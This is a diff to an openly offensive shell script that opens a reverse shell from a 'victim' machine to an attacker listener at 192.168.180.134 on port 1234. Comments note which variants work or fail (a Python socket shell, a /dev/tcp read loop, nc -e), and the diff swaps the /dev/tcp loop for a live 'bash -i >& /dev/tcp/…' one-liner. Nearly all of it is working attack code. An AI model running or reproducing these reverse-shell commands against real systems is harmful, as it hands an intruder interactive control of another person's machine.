@@ -13,8 +13,9 @@ attackerListenPort=1234
 #work --- but will block the execution of the left commands in victim shell.
 #python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.180.134",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-exec 5<>/dev/tcp/$attackerIP/$attackerListenPort
-cat <&5 | while read line; do $line 2>&5 >&5; done
+#exec 5<>/dev/tcp/$attackerIP/$attackerListenPort
+#cat <&5 | while read line; do $line 2>&5 >&5; done
+bash -i >& /dev/tcp/192.168.180.134/1234 0>&1
 
 #don't work --- nc: invalid option -- 'e'
 #nc $attackerIP $attackerListenPort -e "/bin/sh"&
